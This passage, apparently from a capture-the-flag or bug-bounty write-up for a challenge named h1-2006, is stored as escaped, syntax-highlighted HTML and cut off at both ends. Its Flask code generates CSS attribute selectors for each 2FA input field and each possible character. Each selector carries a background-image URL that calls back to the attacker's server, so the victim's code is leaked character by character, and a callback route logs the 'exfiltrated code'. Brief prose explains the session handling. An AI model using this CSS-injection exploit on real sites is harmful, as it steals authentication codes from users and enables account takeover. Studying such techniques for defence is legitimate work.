class=\"p\"\u003e]\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003ecss\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eselectors\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eoriginal_css\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecss\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emimetype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;text/css\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\n\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003eblueprint\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;/h1-2006-callback/\u0026lt;session\u0026gt;/\u0026lt;int:pos\u0026gt;/\u0026lt;char\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eh1_2006_callback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epos\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eglobal\u003c/span\u003e \u003cspan class=\"n\"\u003ecode_chars\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003echars\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003eList\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecode_chars\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n    \u003cspan class=\"n\"\u003echars\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003epos\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003echar\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"bp\"\u003eNone\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003echars\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003echars\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003elogger\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003einfo\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;[session {session}] Exfiltrated code: {code}\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e204\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# 204 No Content, i.e. just empty response\n\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eescape_css_selector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eselector\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eselector\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;!\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e!\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;#\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e#\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;$\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e$\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e%\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"si\"\u003e%\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026amp;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;(\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e(\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;)\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e)\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;*\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e*\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;+\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e+\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;,\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e,\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;-\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e-\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;.\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e.\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;:\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e:\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026lt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026lt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;=\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e=\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;?\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e?\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e@\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;[\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e[\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;]\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e]\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;^\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e^\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;`\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e`\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;{\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e{\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;|\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e|\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;}\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e}\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \\\n        \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;~\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s\"\u003e~\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLet\u0026#39;s break it down.\u003c/p\u003e\n\n\u003cp\u003eFirstly, we build a stylesheet by adding a selector for every code input field, and for every possible character. You would notice that I also use a \u003ccode\u003esession\u003c/code\u003e within my callbacks - this is to ensure that responses from overlapping attempts won\u0026#39;t ever get mixed up.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003eblueprint\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;/uni_2fa_style.css\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003euni_2fa_style_css\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n    \u003cspan class=\"n\"\u003esession\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;session\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003euuid4\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ehex\u003c/span\u003e\u003cspan class=\"p\"\u003e[:\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eselector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epos\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eescape_css_selector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;code_{pos + 1}\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003evalue\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eescape_css_selector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ecallback\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eurl_for\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;.h1_2006_callback\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epos\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003epos\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003echar\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e_external\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003e_scheme\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;https\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;input[name=\u0026quot;{name}\u0026quot;][value=\u0026quot;{value}\u0026quot;]{{background-image: url({callback});}}\u0026#39;\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003eselectors\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan 